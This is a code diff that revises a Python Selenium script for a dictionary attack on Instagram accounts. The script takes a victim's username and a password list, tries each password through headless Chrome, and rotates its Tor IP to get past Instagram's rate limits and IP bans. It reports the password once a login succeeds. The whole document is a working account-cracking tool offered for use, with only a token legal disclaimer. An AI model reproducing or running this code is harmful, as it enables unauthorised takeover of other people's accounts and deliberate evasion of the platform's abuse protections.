@@ -1,15 +1,15 @@
-#Importing modules / libraries
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+from bs4 import BeautifulSoup
 from stem import Signal
 from stem.control import Controller
+from optparse import OptionParser
+import random
 import time
 import sys
-import os
 
-#Pretty self explanatory
-def banner():
-    print("""
+
+banner = """
 -----------------------------------------------
 |---------------------------------------------|
 |        Instagram Dictionary Attack          |
@@ -18,282 +18,218 @@ def banner():
 |                                             |
 | # This script uses TOR proxies              |
 |                                             |
-| # It is the end user's responsibility       |
+| # It is the end user"s responsibility       |
 |  to obey all applicable laws.               |
 |                                             |
 |---------------------------------------------|
 -----------------------------------------------
-    """)
+"""
 
 #USAGE
 def usage():
     print("""\n
-    Usage: py insta.py [-u] [-pl]
-    -u : The username of the victim
-    -pl : The passwordlist to be used
+
+    Usage: insta.py [-u] username [-l] passwordlist
+
+    REQUIRED:
+        -u or --username: The username of the victim
+        -l or --list: The password list to be used 
+    HELP:
+        -h or --help
+        
     """)
     sys.exit()
 
-#########  Taking terminal commands  ###########
+#Setting up the options for the terminal
+parser = OptionParser()
+parser.set_conflict_handler("resolve")
+parser.add_option("-u", "--username", dest="uname")
+parser.add_option("-h", "--help", dest="help", action="store_true")
+parser.add_option("-l", "--list", dest="passlist")
+(options, args) = parser.parse_args()
 
-if sys.argv[1] != "-u":
-    usage()
+# If the username is set, the help menu cannot be shown (if called at the same time)
+if options.uname:
+  options.help = None
+# Run the help menu
+### If the username is not defined
+if options.uname == None:
+  usage()
+### If the passlist is not defined
+if options.passlist == None:
+  usage()
+### If the user has asked for help
+if options.help:
+  usage()
 
-if sys.argv[1] == "-h":
-    usage()
+### Variables
+LOGIN_URL = "https://www.instagram.com/accounts/login/"
+PROXY = "socks5://127.0.0.1:9050"
+IP_CHECK_SITE = "http://icanhazip.com"
+fetchTime = 4
+global uname, passlist
+uname = options.uname
+passlist = options.passlist
+beginning = 0
+end = 1
+hopCount = 1
+#bad titles
+badtitles = [
+  "Login • Instagram",  
+  "Page Not Found &bull; Instagram",
+  "Page Not Found • Instagram",
+]
+#messages that sign that the IP is banned
+bannedIPStrs = [
+  "Please wait a few minutes before you try again",
+  "We couldn't connect",
+  "There was a problem logging you into Instagram",
+  "Page not found"
+]
+#messages that sign that we are in
+LoggedInMsgs = [
+  'class="no-js logged-in',
+  "Suspicious Login Attempt"
+]
+#message(s) that sign that we are OUT
+LoggedOutMsgs = [
+  "incorrect"
+]
 
-uname = sys.argv[2]
-
-
-if sys.argv[3] != "-pl":
-    usage()
-
-passlist = sys.argv[4]
-
-ips = []
-
-#Function for counting all the lines in the text file
-def file_length(fname):
-        with open(fname) as f:
-                for i, l in enumerate(f):
-                        pass
-        return i + 1
-
-
-#Function for getting a new IP, through TOR
-def renew_tor_ip():
-    with Controller.from_port(port = 9051) as controller:
-        controller.authenticate()
-        controller.signal(Signal.NEWNYM)
-
-
-count = file_length(str(passlist))
-
-###########  Setting up the driver  ###################
-
-#Assigning TOR proxy
-PROXY =  "socks5://127.0.0.1:9050"
-#Adding the proxy to chrome
+# Web driver
 options = webdriver.ChromeOptions()
-options.add_argument('--proxy-server=%s' % PROXY)
-options.add_argument('headless')
-options.add_argument('--log-level=3')
-#Setting up the chromedriver
-driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe') 
+options.add_argument(f"--proxy-server={PROXY}")
+options.add_experimental_option('excludeSwitches', ['enable-logging'])
+options.add_argument("headless")
+driver = webdriver.Chrome(options=options)
 
-# VARS
-a = 0
-b = 1
-n = 0
+# Class for all the methods we need
+class Engine():
+  def __init__(self):
+    self.username =  uname
+    self.passlist = passlist
 
-##### 1st time start up info  ######
-print("\n")
-banner()
-print("Target: {} || Password List: {} || List length: {}".format(uname, passlist, file_length(str(passlist))))
-time.sleep(5)
-# Main Loop
-while True:
-    n += 1
-    if n % 9 == 0:
-        renew_tor_ip()
-        driver.quit()
-        #Assigning TOR proxy
-        PROXY =  "socks5://127.0.0.1:9050"
-        #Adding the proxy to chrome
-        options = webdriver.ChromeOptions()
-        options.add_argument('--proxy-server=%s' % PROXY)
-        options.add_argument('headless')
-        options.add_argument('--log-level=3')
-        #Setting up the chromedriver
-        driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe') 
-        print("\n")
-        print("This IP was used 9 times")
-        print("Getting new IP...")
-    # Separating words in the wordlist
-    f = open(str(passlist),"r")
-    passw = f.readlines()[a:b]
+  # Deal with the file and new password + increment counters
+  def takefile(self):
+    global beginning,end,p,hopCount
+    if hopCount == 1:
+      print(banner)
+      print("\n")
+    passwordFile = open(passlist, "r")
+    passw = passwordFile.readlines()[beginning:end]
     for p in passw:
-        p = str(p)
-        p = p.replace("[", "")
-        p = p.replace("]", "")
-        p = p.replace("'", "")
-        p = p.replace("\n", "")
-        p = p.replace(",", "")
-        print("\n")
-    f.close()
-    #Incrementing variables (lines)
-    a += 1
-    b += 1
-    #INFO
-    print("\n")
-    print("-----------------------------")
-    print("Password:", p)
-    print("Try: ", n)
-    print("-----------------------------")
+      p = str(p)
+      p = p.replace("[", "")
+      p = p.replace("]", "")
+      p = p.replace("'", "")
+      p = p.replace("\n", "")
+      p = p.replace(",", "")
+    passwordFile.close()
+    print("------------------------------")
+    print(f"Username: {uname}")
+    print(f"Password: {p}")
+    print(f"Number of tries: {hopCount}")
+    print("------------------------------")
+    beginning += 1
+    end += 1
+    hopCount += 1
+    return p
 
-##########################  Getting Instagram, and filling in the input fields  ##########################
-
-    #Navigating to Instagram login page
-    driver.get('https://www.instagram.com/accounts/login/')
-    time.sleep(10)
-
-    #Finding the username and password boxes
-    username = driver.find_element_by_name("username")
-    password = driver.find_element_by_name("password")
-
-    #Entering username and password
-    username.send_keys(str(uname))
-    if len(p) < 6:
-        p + "11111"
-        password.send_keys(str(p + "11111"))
+  # New TOR IP + new browser
+  def renew_tor_ip(self):
+    global driver
+    with Controller.from_port(port=9051) as controller:
+      time.sleep(fetchTime - 2)
+      controller.authenticate()
+      controller.signal(Signal.NEWNYM)
+      print("[!] New IP is assigned")
+      print("[!] New browser is opened")
+      driver.quit()
+      options = webdriver.ChromeOptions()
+      options.add_argument(f"--proxy-server={PROXY}")
+      options.add_experimental_option('excludeSwitches', ['enable-logging'])
+      options.add_argument("headless")
+      driver = webdriver.Chrome(options=options)
+      return controller
+    
+  # logging in to insta 
+  def loginProcedure(self):
+    driver.get(LOGIN_URL)
+    while driver.current_url != LOGIN_URL:
+      driver.get(LOGIN_URL)
+    time.sleep(fetchTime)
+    #banned ip
+    for string in bannedIPStrs:
+      if string in driver.page_source:
+        print("[!] IP banned by Instagram")
+        self.renew_tor_ip()
+        global beginning, end
+        beginning -= 1
+        end -= 1
+        driver.get(LOGIN_URL)
+        time.sleep(fetchTime)
+    username_field = driver.find_element_by_name("username")
+    password_field = driver.find_element_by_name("password")
+    username_field.send_keys(uname)
+    if len(p) > 6:
+      p + "111111"
+      password_field.send_keys(p)
     else:
-        password.send_keys(str(p))
-    time.sleep(1)
-
-    #Submitting, the password and the username
-    submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
+      password_field.send_keys(p)
+    submit = driver.find_element_by_class_name("sqdOP.L3NKy.y3zKF")
     submit.click()
-    time.sleep(10)
+    time.sleep(fetchTime + 1)
+    return driver.page_source
 
-######################  Login Detection  ######### ############
-
-    if "incorrect" in driver.page_source:
-        print("Wrong password, no match")
-        print("-----------------------------")
-        time.sleep(1)
-
-    elif "Page Not Found" in driver.page_source:
-        a -= 1
-        b -= 1
+  # Login detection
+  def getError(self):
+    global driver
+    soup = BeautifulSoup(driver.page_source, "html.parser")
+    #banned ip
+    for string in bannedIPStrs:
+      if string in driver.page_source:
+        print("[!] IP banned by Instagram")
+        self.renew_tor_ip()
+        global beginning, end
+        beginning -= 1
+        end -= 1
+    #other login possibilities
+    for msgs in LoggedInMsgs:
+      if msgs in soup:
+        for i in range(2):
+          print("\n")
+        print("[+] Password found")
+        print(f"Password: {p}")
+        print(f"Username: {uname}")
         print("\n")
-        print("Lost Connection :(")
-        print("Re-Connecting")
-        time.sleep(2)
-        renew_tor_ip()
-
-    elif "Suspicious Login Attempt" in driver.page_source:
-        print("\n")
-        print("Password Found")
-        print("The password is:", p)
+        driver.quit()
         sys.exit()
-
-    elif "Please wait a few minutes before you try again." in driver.page_source:
-        a -= 1
-        b -= 1
+    # title
+    if soup.title.string in badtitles:
+      print("[-] No match")    
+      print("------------------------------")
+      print("\n")
+     # title
+    elif "incorrect" in badtitles:
+      print("[-] No match")
+      print("------------------------------")
+      print("\n")
+    # good title
+    else:
+      for i in range(2):
         print("\n")
-        print("Instagram has banned this IP")
-        print("Requesting new one")
-        time.sleep(10)
-        renew_tor_ip()
-
-    elif 'class="no-js logged-in' in driver.page_source:
-        print("\n")
-        print("Password Found")
-        print("The password is:", p)
-        sys.exit()
-
-    elif "We couldn't connect" in driver.page_source:
-        a -= 1
-        b -= 1
-        print("\n")
-        print("Instagram has banned this IP")
-        print("Requesting new one")
-        time.sleep(10)
-        renew_tor_ip()
-
-    elif "The username you entered doesn't belong to an account." in driver.page_source:
-        print("\n")
-        print("WRONG USERNAME")
-        print("Check the username, and run the script again")
-        sys.exit()
-
-    elif 'There was a problem logging you into Instagram' in driver.page_source:
-        for t in range(2):
-            submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
-            submit.click()
-            time.sleep(3)
-            if "incorrect" in driver.page_source:
-                print("\n")
-                print("Wrong password, no match")
-                print("Trying another password")
-                break
-            elif "We couldn't connect" in driver.page_source:
-                a -= 1
-                b -= 1
-                print("\n")
-                print("Instagram has banned this IP")
-                print("Requesting new one")
-                time.sleep(10)
-                renew_tor_ip()
-
-            elif "Page Not Found" in driver.page_source:
-                a -= 1
-                b -= 1
-                print("\n")
-                print("Lost Connection :(")
-                print("Re-Connecting")
-                time.sleep(2)
-                renew_tor_ip()
-
-            elif "Suspicious Login Attempt" in driver.page_source:
-                print("\n")
-                print("Password Found")
-                print("Username:", uname)
-                print("The password is:", p)
-                print("\n")
-                sys.exit()
-
-            elif 'class="no-js logged-in' in driver.page_source:
-                print("\n")
-                print("Password Found")
-                print("Username:", uname)
-                print("The password is:", p)
-                print("\n")
-                sys.exit()
-
-            elif "The username you entered doesn't belong to an account." in driver.page_source:
-                print("\n")
-                print("WRONG USERNAME")
-                print("Check the username, and run the script again")
-                sys.exit()
-            elif "Please wait a few minutes before you try again." in driver.page_source:
-                a -= 1
-                b -= 1
-                print("\n")
-                print("Instagram has banned this IP")
-                print("Requesting new one")
-                time.sleep(10)
-                renew_tor_ip()
-
-            else:
-                continue
-        if 'There was a problem logging you into Instagram' in driver.page_source:
-            a -= 1
-            b -= 1
-            renew_tor_ip()
-        
-        elif "Page Not Found" in driver.page_source:
-            a -= 1
-            b -= 1
-            print("\n")
-            print("Lost Connection :(")
-            print("Re-Connecting")
-            time.sleep(2)
-            renew_tor_ip()
-            
-        elif "Please wait a few minutes before you try again." in driver.page_source:
-            a -= 1
-            b -= 1
-            print("\n")
-            print("Instagram has banned this IP")
-            print("Requesting new one")
-            time.sleep(10)
-            renew_tor_ip()
-
-        elif 'class="no-js logged-in' in driver.page_source:
-            print("\n")
-            print("Password Found")
-            print("Username:", uname)
-            print("The password is:", p)
-            print("\n")
-            sys.exit()
+      print("[+] Password found")
+      print(f"Password: {p}")
+      print(f"Username: {uname}")
+      print("\n")
+      driver.quit()
+      sys.exit()
+    
+#Looping
+while True:
+  BRUTER = Engine()
+  BRUTER.takefile()
+  BRUTER.loginProcedure()
+  BRUTER.getError()
+  
+# Happy hacki... No, no, no, only for ethical purposes 
